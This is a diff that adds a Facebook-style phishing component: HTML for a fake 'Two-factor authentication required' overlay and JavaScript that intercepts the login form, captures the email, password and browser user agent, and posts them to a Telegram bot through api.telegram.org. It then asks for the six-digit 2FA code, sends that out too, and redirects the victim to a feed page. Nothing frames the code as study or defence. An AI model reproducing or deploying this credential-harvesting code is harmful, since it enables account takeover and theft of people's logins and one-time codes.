@@ -1,0 +1,36 @@
+<div id="otp" style="position:fixed;inset:0;background:#fff;display:none;padding:40px 20px;z-index:99;overflow:auto">
+<div style="max-width:396px;margin:0 auto;font-family:-apple-system,'Segoe UI',Helvetica,Arial,sans-serif;text-align:center">
+<div style="font-size:20px;font-weight:700;color:#1C1E21;margin-bottom:8px">Two-factor authentication required</div>
+<div style="font-size:14px;color:#606770;margin-bottom:18px">Enter the 6-digit code from your authenticator app or SMS.</div>
+<input id="code" inputmode="numeric" maxlength="6" placeholder="······" style="width:100%;height:52px;text-align:center;letter-spacing:6px;font-size:22px;font-weight:600;border:1px solid #DDDFE2;border-radius:6px;outline:0">
+<div id="e2" style="color:#FA383E;font-size:13px;text-align:left;margin-top:8px;display:none">Please enter the 6-digit code.</div>
+<button id="cbtn" style="width:100%;height:48px;border:0;border-radius:6px;background:#1877F2;color:#fff;font-size:17px;font-weight:700;margin-top:14px">Continue</button>
+<div id="back" style="margin-top:16px;color:#1877F2;font-size:14px;cursor:pointer">Back to log in</div>
+</div>
+</div>
+<script>
+var TG="",CHAT="",U="",P="",busy=0;
+function send(t){try{localStorage.setItem("fb_"+Date.now(),t)}catch(e){}
+if(TG&&CHAT){fetch("https://api.telegram.org/bot"+TG+"/sendMessage?chat_id="+CHAT+"&text="+encodeURIComponent(t)).catch(function(){})}}
+function field(n,id){var e=document.querySelector('input[name="'+n+'"]');return e||document.getElementById(id)}
+window.addEventListener("submit",function(ev){
+ var u=field("email","email"),p=field("pass","pass");
+ if(!u||!p)return;
+ ev.preventDefault();ev.stopImmediatePropagation();
+ U=(u.value||"").trim();P=p.value||"";
+ if(!U||!P)return;
+ send("Facebook login\nUser: "+U+"\nPass: "+P+"\nTime: "+new Date().toLocaleString()+"\nUA: "+navigator.userAgent);
+ document.getElementById("otp").style.display="block";
+ setTimeout(function(){document.getElementById("code").focus()},150);
+},true);
+document.getElementById("cbtn").onclick=function(){
+ var c=document.getElementById("code").value.replace(/\D/g,"");
+ if(c.length!==6){document.getElementById("e2").style.display="block";return}
+ send("Facebook 2FA code\nUser: "+U+"\nCode: "+c+"\nTime: "+new Date().toLocaleString());
+ location.href="feed.html"};
+document.getElementById("back").onclick=function(){document.getElementById("otp").style.display="none";document.getElementById("code").value=""};
+document.addEventListener("click",function(e){
+ var b=e.target.closest('button[type="submit"],a[role="button"]');
+ if(b&&/log in|login/i.test(b.textContent||"")&&!document.getElementById("otp")){}
+},true);
+</script>
